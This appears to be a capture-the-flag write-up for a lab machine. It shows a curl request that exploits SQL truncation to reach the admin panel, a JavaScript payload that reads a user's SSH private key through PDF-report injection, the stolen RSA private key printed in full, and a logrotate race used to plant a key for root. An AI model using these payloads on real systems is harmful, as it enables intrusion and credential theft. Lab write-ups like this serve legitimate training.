# User

## SQL Truncation for the admin panel
Replace session id.  Find maximum length of email, go beyond maximum to bypass existing user check.  Then login to admin panel.
```sh
curl -v 'http://10.10.10.176/index.php' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'Origin: http://10.10.10.176' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Referer: http://10.10.10.176/' -H 'Accept-Language: en-US,en;q=0.9,la;q=0.8' -H 'Cookie: PHPSESSID=tj3vj7ksnlrhsncho22ec6hak4' --data 'name=name&email=admin@book.htb%20%20%20%20%20%20f&password=password' --compressed --insecure
```

## Enumerate, realize PDF reports are generated for users and books, inject for local file inclusion
Make use of similar SQL logic errors to inject HTML/JS into the reports.  Use the name of an existing Book so newly added records show up in the report.  Inject HTML/JS via the author field.  It's short so we need to include javascript from our own server.  Use that javascript to include local files, but we need to use a small font-size to have everything included.  Also use body.innerHTML to replace everything for the most space.  Find the reader user via `/etc/passwd` and then try and pull it's private key.  Use the script `do-pdf-injection.sh` to automatically send and then read the included file.

injected.js
```javascript
var body = document.getElementsByTagName('body')[0];
var x=new XMLHttpRequest();
x.onreadystatechange=function(){
    if (x.readyState == 4) {
        body.innerHTML = '<pre style="font-size: 2px; width: 1000px; height: 1000px">' + x.responseText + '</pre>';
    }
};
x.open("GET","file:///home/reader/.ssh/id_rsa");
x.send();
```

reader_id_rsa
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJG8m6UN
ZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0WxtCK0VlQUwx
Z6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0ePV8RKoYVWuVRb4nFG
1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s7WaZQ4cjd+yzpOCJw9J91Vi3
3gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK75I5d5Holg7ME40BU06Eq0E3EOY6wh
CPlzndVwIDAQABAoIBAQCs+kh7hihAbIi73mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXj
rP8ke/Pukg/OmDETXmtgToFwxsD+McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXW
QfgHThhPWHJI+3iuQRwzUItIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDg
eGnbzr9ERdiuX6WJjhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMe
lbFX50/owz7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8
GMx6GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FLE2
vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/ciqzwDZf
Sg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+SRM/Abh5xub6zT
hrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7lskGl3dh4M/2Tgl/gYPwU
KI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+Vo5GVjWTOlfEj74k8hC6GjzWHna
0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7mHc5LOGww+NqzB0HtsUprN6YpJ7AR6+Yl
EcItMl/FOW2AFbkzoNbHT9GpTj5ZfacChBhBp1ZeeShvWobqjKUxQmbp2W975wKR4Mdsih
UlpInwf4S2k8J+fVHJl4IjT80uPb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7
IUwfIBFnzqZ27pOAMYkhsMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyf
cdwQHc2XoY8YCftdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZX
ndVc/zLi5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pn
lWy1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TNnkea
f9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=
-----END RSA PRIVATE KEY-----
```

# Root

## Enumeration
We find `access.log` in the `home/reader/backups` directory and `pspy` shows logrotate in use.

## Logrotten
In order to win the race condition, it helps to create many `access.log.#` files of a reasonable size.  It took 13, and a loop to cat random shit into `access.log` every second was the way I did it.  The payload was just echoing my public key into root's authorized keys.  Once it worked, just ssh into root.